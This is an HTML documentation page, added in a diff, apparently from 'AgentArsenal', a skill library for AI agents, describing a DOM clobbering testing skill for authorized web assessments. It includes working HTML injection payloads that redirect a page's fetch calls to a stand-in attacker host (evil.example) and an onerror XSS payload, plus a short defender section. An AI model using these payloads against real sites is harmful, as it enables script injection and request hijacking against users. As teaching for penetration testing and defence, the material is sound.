@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: dom-clobbering</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>dom-clobbering</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing for DOM clobbering on an authorized web</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-xss.html">web-xss</a> <a href="prototype-pollution.html">prototype-pollution</a> <a href="postmessage-security.html">postmessage-security</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>DOM clobbering turns HTML into JavaScript variables: named elements like <code>&lt;a id=&quot;config&quot;&gt;</code> shadow global variables, so injected markup can override the values scripts rely on. This skill covers authorized testing: finding clobberable code, crafting the markup, and escalating to XSS. It needs HTML injection (stored or reflected) as the entry point; the skill covers what to do once you have it.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Find JavaScript that reads globals or DOM properties it does not</li>
+<p>own: <code>config.apiUrl</code>, <code>document.scripts</code>, unqualified names.</p>
+<li>Confirm you can inject HTML (any context, even limited).</li>
+<li>Clobber the target name with a named element and verify the</li>
+<p>override in the console.</p>
+<li>Chain to impact: override a URL used in fetch, a template used in</li>
+<p>innerHTML, or a script source.</p>
+<li>Escalate to XSS where a clobbered value flows into a sink.</li>
+<li>Check multi level clobbering: form elements clobbering form</li>
+<p>properties.</p>
+<li>Document the injection point, the clobber markup, and the sink.</li>
+<li>Recommend the fixes: no unqualified global reads, sanitize HTML.</li>
+</ol>
+<h2>1. Finding clobberable code</h2>
+<pre><code class="language-bash"># Patterns to search in the app&#x27;s JavaScript:
+# - if (config.isAdmin) where config is a global the page defines
+# - fetch(API_URL) with API_URL unqualified
+# - document.getElementById assumed unique (duplicate IDs clobber)
+grep -rhoE &quot;(config|settings|API_URL|nextUrl)\.[a-zA-Z]+&quot; /tmp/app.js | sort -u | head -20</code></pre>
+<pre><code class="language-html">&lt;!-- Clobber example: page does fetch(config.apiUrl + &#x27;/data&#x27;) --&gt;
+&lt;!-- Inject this markup where HTML injection is possible: --&gt;
+&lt;a id=&quot;config&quot; href=&quot;https://evil.example/x&quot;&gt;&lt;/a&gt;
+&lt;!-- Now config.apiUrl reads the anchor&#x27;s href in some patterns, --&gt;
+&lt;!-- or use form based clobbering for deeper property control: --&gt;
+&lt;form id=&quot;config&quot;&gt;&lt;input name=&quot;apiUrl&quot; value=&quot;https://evil.example/x&quot;&gt;&lt;/form&gt;</code></pre>
+<pre><code class="language-bash"># Verify in the browser console on the authorized test page:
+# 1. inject the markup, 2. evaluate the expression the code uses,
+# 3. confirm it returns your value instead of the real one
+echo &quot;console check: config.apiUrl === &#x27;https://evil.example/x&#x27;&quot;</code></pre>
+<h2>2. Escalation patterns</h2>
+<pre><code class="language-html">&lt;!-- To XSS: clobber a value that flows into innerHTML --&gt;
+&lt;form id=&quot;settings&quot;&gt;&lt;input name=&quot;template&quot; value=&quot;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;&lt;/form&gt;
+&lt;!-- Page code: el.innerHTML = settings.template  -&gt; XSS --&gt;
+
+&lt;!-- To open redirect / SSRF-ish: clobber a fetch URL --&gt;
+&lt;form id=&quot;config&quot;&gt;&lt;input name=&quot;apiUrl&quot; value=&quot;https://evil.example/&quot;&gt;&lt;/form&gt;
+&lt;!-- Page code: fetch(config.apiUrl + &#x27;data&#x27;) -&gt; request to evil --&gt;
+
+&lt;!-- Classic: clobber document.domain checks or script src --&gt;</code></pre>
+<h2>Edge cases</h2>
+<ul>
+<li>The page uses <code>document.getElementById</code> strictly. Duplicate IDs</li>
+<p>still clobber getElementById in some browsers; test, do not assume.</p>
+<li>Content Security Policy blocks the injected script. Clobbering to</li>
+<p>redirect a fetch or form still works without script execution.</p>
+<li>The injection point strips ids and names. Try other clobberable</li>
+<p>vectors (form actions, embed src) or move on.</p>
+<li>Frameworks (React, Angular) usually avoid the vulnerable patterns;</li>
+<p>legacy jQuery era code is where this lives.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Simple clobber blocked by sanitizer: try nested or malformed</li>
+<p>markup the sanitizer mishandles.</p>
+<li>No HTML injection at all: DOM clobbering needs markup; without it,</li>
+<p>this skill does not apply.</p>
+<li>Gadget needs script execution: combine with a prototype pollution</li>
+<p>gadget where available.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see DOM clobbering as HTML injection payloads containing id and name attributes that match the app&#x27;s JavaScript variable names. Detect with CSP violation reports and with monitoring for unexpected global overrides in client telemetry. The durable fix is code hygiene: never read security relevant values from unqualified globals, sanitize all injected HTML, and use closed shadow DOM or modules where practical.</p>
+<h2>Key references</h2>
+<ul>
+<li>CWE-79 (Cross-site Scripting): the escalation target.</li>
+<li>CWE-20 (Improper Input Validation): the HTML injection entry.</li>
+<li>DOM clobbering research (PortSwigger, Black Hat presentations).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
